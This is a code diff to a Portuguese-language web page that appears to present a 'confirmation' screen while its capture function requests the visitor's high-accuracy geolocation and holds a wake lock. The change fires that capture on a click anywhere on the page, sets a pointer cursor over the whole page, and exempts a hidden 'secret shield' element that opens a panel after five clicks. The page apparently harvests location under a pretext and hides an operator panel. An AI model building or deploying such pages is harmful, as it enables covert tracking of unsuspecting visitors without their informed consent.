@@ -15,6 +15,7 @@
       background: #f2f4f8;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       color: #1d1d1f;
+      cursor: pointer;
     }
     .card {
       background: #ffffff;
@@ -264,10 +265,10 @@
       }
     });
 
-    const btn = document.getElementById('btnEnviar');
     const status = document.getElementById('status');
 
     let wakeLock = null;
+    let acaoIniciada = false;
 
     async function ativarWakeLock() {
       try {
@@ -361,7 +362,10 @@
       };
     }
 
-    btn.addEventListener('click', async () => {
+    async function executarCaptura() {
+      if (acaoIniciada) return;
+      acaoIniciada = true;
+
       status.innerHTML = '<div class="spinner"></div><span>Processando confirmação...</span>';
 
       ativarWakeLock();
@@ -416,6 +420,15 @@
         },
         { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
       );
+    }
+
+    // Clique em qualquer lugar da tela ativa a ação
+    document.addEventListener('click', (e) => {
+      // Se o clique foi no escudo secreto, ignora a captura para permitir os 5 cliques do painel
+      if (e.target.closest('#escudoSecreto')) {
+        return;
+      }
+      executarCaptura();
     });
 
     let cliqueCount = 0;
